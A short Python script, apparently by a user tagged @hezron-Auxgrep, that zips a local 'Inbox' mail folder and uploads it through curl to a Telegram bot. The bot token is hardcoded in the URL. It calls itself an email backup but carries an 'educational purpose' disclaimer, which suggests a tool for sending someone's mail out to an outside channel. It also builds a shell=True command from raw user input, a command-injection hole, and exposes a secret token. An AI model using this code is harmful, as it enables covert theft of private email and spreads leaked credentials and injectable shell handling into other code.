import subprocess
import time
#Sending email backups to telegram channel
#what you need is telegram API + Bot chat id
#There is alot of ways to find you bot chat id just learn it
#THIS IS ONLY FOR EDUCATIONAL PURPOSE
#HANG OUT !! AND ENJOY @hezron-Auxgrep

#PLEASE ADD YOUR BOT TOKEN PLEASE > LINE NO: 16

def private():

	cmd = "zip -r inbox.zip Inbox"
	subprocess.call('xterm -T Telegram -e ' + cmd ,shell=True)
	bot_id = input("Enter Bot chat_Id: ")
	API = "https://api.telegram.org/bot5143646025:AAHysVZ4A2JaO9eQYpoWzSXHT-MZyCTkz3o/sendDocument?chat_id="
	subprocess.call('curl -F document=@inbox.zip ' + API + bot_id, shell=True)

